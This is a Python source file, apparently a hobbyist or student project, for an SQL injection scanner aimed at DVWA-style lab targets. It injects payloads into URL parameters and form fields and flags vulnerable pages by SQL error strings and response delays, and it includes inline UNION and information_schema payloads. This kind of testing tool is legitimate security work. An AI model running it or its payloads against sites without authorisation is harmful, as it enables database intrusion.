import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urlparse, urljoin
import urllib.parse

# 06/09/2023 : Code check sqli thi duoc nhung chua goi la hoan hao, dang nghien cuu de cai tien
# maker : RBKING

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0.5938.92"


class SQli:

    def __init__(self, url):
        self.url = url

    # Uncomment the code below for DWVA
    # login_payload = {
    #     "username": "admin",
    #     "password": "password",
    #     "Login": "Login",
    # }
    # # change URL to the login page of your DVWA login URL
    # login_url = "http://192.168.168.105/dvwa/login.php"

    # # login
    # r = s.get(login_url)
    # token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
    # login_payload['user_token'] = token
    # s.post(login_url, data=login_payload)

    # ---------------------------------------------------------------

    forms = []

    def scan_website(self, url):
        soup = bs(s.get(url).content, "html.parser")
        results = {
            "sqli": []
        }
        urls = urlparse(url)
        global forms
        forms = bs(s.get(url).content, "html.parser").find_all("form")
        if self.check_sqli(url):
            results["sqli"].append({
                "url": url,
                "details": "[+] SQL Injection detected"
            })
        return results

    # -----------------------------------------------------

    def is_vulnerable_sqli(self, response):

        errors = {
            "you have an error in your sql syntax;",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
        }

        response_time = response.elapsed.total_seconds()
        if response_time > 10:
            print("[!] Slow response time detected")
            return True

        complex_payload = "1' AND (SELECT * FROM information_schema.tables)='"
        if complex_payload in response.content.decode().lower():
            print("[!] Complex payload was successful")
            return True

        dump_payload = "1' UNION SELECT NULL, NULL, @@version;--"
        if dump_payload in response.content.decode().lower():
            print("[!] Data dump was successful")
            return True

        for error in errors:
            if error in response.content.decode().lower():
                return True

        return False

    # ---------------------------------

    def get_all_forms(self, url):
        soup = bs(s.get(url).content, "html.parser")
        return soup.find_all("form")

    def get_form_details(self, form):
        details = {}
        try:
            action = form.attrs.get("action").lower()
        except:
            action = None

        method = form.attrs.get("method", "get").lower()

        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append(
                {"type": input_type, "name": input_name, "value": input_value})

        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    # -------------------------------------------------------------

    def check_sqli(self, url):

        with open('sqli_payload.txt') as f:
            sqli_payloads = f.read().splitlines()
            print("\n[+] Checking SQLi")

        for payload in sqli_payloads:
            encoded_payload = urllib.parse.quote(payload)
            new_url = f"{url}?id={encoded_payload}"
            print("[!] Trying", new_url)

            res = s.get(new_url)
            if self.is_vulnerable_sqli(res):
                print("[+] SQL Injection vulnerability detected, link:", new_url)
                return True

        forms = self.get_all_forms(url)
        print(
            f"[+] Detected {len(forms)} forms on {url} and form found: {forms}")

        for form in forms:
            form_details = self.get_form_details(form)
            for payload in sqli_payloads:
                data = {}

                for input_tag in form_details["inputs"]:
                    if input_tag["value"] or input_tag["type"] == "hidden":
                        try:
                            data[input_tag["name"]] = input_tag["value"] + payload
                        except:
                            pass
                    elif input_tag["type"] != "submit":
                        data[input_tag["name"]] = f"test{payload}"

                url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    res = s.post(url, data=data)
                elif form_details["method"] == "get":
                    res = s.get(url, params=data)

                curr_url = url
                results = {
                    "sqli": []
                }

                if self.is_vulnerable_sqli(res):
                    results["sqli"].append({
                        "url": curr_url,
                        "details": "[+] SQLi vulnerability detected"
                    })

                    return True

        print("[+] Check SQLi done")
        return False
